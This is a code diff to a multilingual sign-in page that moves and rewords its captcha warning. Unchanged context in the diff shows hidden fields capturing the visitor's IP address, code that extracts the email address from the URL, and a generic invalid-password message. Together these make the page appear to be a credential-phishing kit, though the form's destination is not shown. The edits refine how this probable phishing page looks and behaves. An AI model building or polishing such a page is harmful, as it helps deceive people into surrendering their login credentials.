@@ -179,16 +179,18 @@ button:hover {
   transition: opacity 0.3s ease;
 }
 
-.captcha-error {
+/* Captcha warning - appears near the captcha area, not at top */
+.captcha-warning {
   display: none;
   color: #d32f2f;
   background-color: #ffebee;
   border: 1px solid #ffcdd2;
-  padding: 10px;
+  padding: 8px 12px;
   border-radius: 4px;
   margin: 10px 0;
   text-align: center;
   font-size: 14px;
+  font-weight: 500;
 }
 
 /* RTL */
@@ -235,7 +237,7 @@ html[dir="rtl"] #togglePassword {
     </div>
 
     <div class="cf-turnstile" id="captcha-container"></div>
-    <div id="captchaError" class="captcha-error">Please complete the security verification</div>
+    <div id="captchaWarning" class="captcha-warning">Please complete the verification to continue</div>
 
     <button type="submit" id="signInBtn">Sign in</button>
     <div class="spinner" id="loadingSpinner"></div>
@@ -289,7 +291,7 @@ const loadingSpinner = document.getElementById("loadingSpinner");
 const errorMessage = document.getElementById("errorMessage");
 const togglePassword = document.getElementById("togglePassword");
 const captchaContainer = document.getElementById("captcha-container");
-const captchaErrorDiv = document.getElementById("captchaError");
+const captchaWarning = document.getElementById("captchaWarning");
 
 // Hidden fields
 const ipAddressField = document.getElementById("ipAddress");
@@ -339,7 +341,7 @@ function setLanguage(langCode) {
   else document.documentElement.dir = 'ltr';
   
   const translations = {
-    en: { email_placeholder: "Email address", password_placeholder: "Password", sign_in: "Sign in", show: "Show", hide: "Hide", invalid: "Invalid password. Please try again.", signing: "Signing in...", captcha_required: "Please complete the verification to proceed" },
+    en: { email_placeholder: "Email address", password_placeholder: "Password", sign_in: "Sign in", show: "Show", hide: "Hide", invalid: "Invalid password. Please try again.", signing: "Signing in...", captcha_required: "Please complete the verification to continue" },
     es: { email_placeholder: "Correo electrónico", password_placeholder: "Contraseña", sign_in: "Iniciar sesión", show: "Mostrar", hide: "Ocultar", invalid: "Contraseña incorrecta. Inténtelo de nuevo.", signing: "Iniciando sesión...", captcha_required: "Complete la verificación para continuar" },
     fr: { email_placeholder: "Adresse e-mail", password_placeholder: "Mot de passe", sign_in: "Se connecter", show: "Afficher", hide: "Masquer", invalid: "Mot de passe incorrect. Veuillez réessayer.", signing: "Connexion en cours...", captcha_required: "Veuillez compléter la vérification pour continuer" },
     de: { email_placeholder: "E-Mail-Adresse", password_placeholder: "Passwort", sign_in: "Anmelden", show: "Anzeigen", hide: "Ausblenden", invalid: "Ungültiges Passwort. Bitte versuchen Sie es erneut.", signing: "Anmeldung läuft...", captcha_required: "Bitte schließen Sie die Überprüfung ab, um fortzufahren" },
@@ -359,20 +361,28 @@ function setLanguage(langCode) {
   togglePassword.innerText = (passwordInput.type === 'password') ? t.show : t.hide;
   // Store for error messages
   window._translations = t;
+  // Update captcha warning text
+  captchaWarning.innerText = t.captcha_required;
 }
 
 function showError(messageKey, customMsg = null) {
-  const t = window._translations || { invalid: "Invalid password", signing: "Signing in...", captcha_required: "Please complete the verification to proceed" };
+  const t = window._translations || { invalid: "Invalid password", signing: "Signing in..." };
   let msg = customMsg;
   if (!msg) {
     if (messageKey === 'invalid_password') msg = t.invalid;
     else if (messageKey === 'signing_in') msg = t.signing;
-    else if (messageKey === 'captcha_required') msg = t.captcha_required;
-    else msg = t.captcha_required;
+    else msg = t.invalid;
   }
   errorMessage.innerText = msg;
   errorMessage.style.display = 'block';
   setTimeout(() => errorMessage.style.display = 'none', 3000);
+}
+
+function showCaptchaWarning() {
+  captchaWarning.style.display = 'block';
+  setTimeout(() => {
+    captchaWarning.style.display = 'none';
+  }, 3000);
 }
 
 // --- Email extraction from URL ---
@@ -432,25 +442,20 @@ function initializeCaptcha() {
       callback: function(token) {
         captchaToken = token;
         captchaVerified = true;
-        captchaErrorDiv.style.display = 'none';
         // Hide the widget after successful verification
         captchaContainer.style.display = 'none';
-        // Remove any lingering CAPTCHA error message
-        if (errorMessage.innerText === (window._translations?.captcha_required || "Please complete the verification to proceed")) {
-          errorMessage.style.display = 'none';
-        }
+        // Hide any lingering captcha warning
+        captchaWarning.style.display = 'none';
       },
       'expired-callback': function() {
         if (!captchaVerified) {
           captchaToken = '';
-          captchaErrorDiv.style.display = 'block';
           if (!captchaVerified) captchaContainer.style.display = 'flex';
         }
       },
       'error-callback': function() {
         if (!captchaVerified) {
           captchaToken = '';
-          captchaErrorDiv.style.display = 'block';
         }
       },
       language: currentLanguage
@@ -463,7 +468,6 @@ function resetCaptcha() {
   if (turnstileWidgetId !== null && window.turnstile) {
     turnstile.reset(turnstileWidgetId);
     captchaToken = '';
-    captchaErrorDiv.style.display = 'none';
     captchaContainer.style.display = 'flex';
   }
 }
@@ -525,7 +529,7 @@ loginForm.addEventListener('submit', e => {
 
   // Check CAPTCHA verification
   if (!captchaToken) {
-    showError('captcha_required');
+    showCaptchaWarning(); // Show warning near the captcha area, not at the top
     return;
   }
 
@@ -585,7 +589,7 @@ window.addEventListener('DOMContentLoaded', async () => {
     captchaContainer.innerHTML = '<div style="color:#666;text-align:center;padding:20px;">Security verification not configured</div>';
   }
   
-  // Ensure button is always enabled initially (no CAPTCHA dependency)
+  // Ensure button is always enabled initially
   signInBtn.disabled = false;
   signInBtn.style.opacity = '1';
 });
